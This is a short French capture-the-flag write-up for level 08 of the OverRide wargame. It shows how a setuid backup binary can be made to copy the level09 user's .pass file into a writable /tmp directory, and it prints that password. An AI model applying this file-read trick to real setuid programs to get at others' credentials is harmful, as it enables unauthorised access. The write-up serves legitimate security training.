# Level 08

Le programme ecris le contenu du fichier en parametre dans un fichier du meme nom dans le dossier backlog.
Des logs sont affiches dans le fichiers backups/.log.

Comme le programme est executer avec le UID level09 nous pouvons donner le .pass du level09 en parametre.
Mais nous pouvons faire cela que dans le dossier /tmp qui est possible d'ecriture.

Enfin il faut tout de meme creer le dossier une premiere fois, car dans le code le dossier ./backup est specifie.

```
level08@OverRide:/tmp$ ls
backups  payload4
level08@OverRide:/tmp$ rm -rf backups/
level08@OverRide:/tmp$ cd
level08@OverRide:~$ ls
backups  level08
level08@OverRide:~$ cd /tmp/
level08@OverRide:/tmp$ ~/level08
Usage: /home/users/level08/level08 filename
ERROR: Failed to open ./backups/.log
level08@OverRide:/tmp$ cp -rf ~/backups/ .
level08@OverRide:/tmp$ ~/level08 /home/users/level09/.pass
ERROR: Failed to open ./backups//home/users/level09/.pass
level08@OverRide:/tmp$ mkdir -p backups/home/users/level09
level08@OverRide:/tmp$ ~/level08 /home/users/level09/.pass
level08@OverRide:/tmp$ cat backups/home/users/level09/.pass
fjAwpJNs2vvkFLRebEvAQ2hFZ4uQBWfHRsP62d8S
```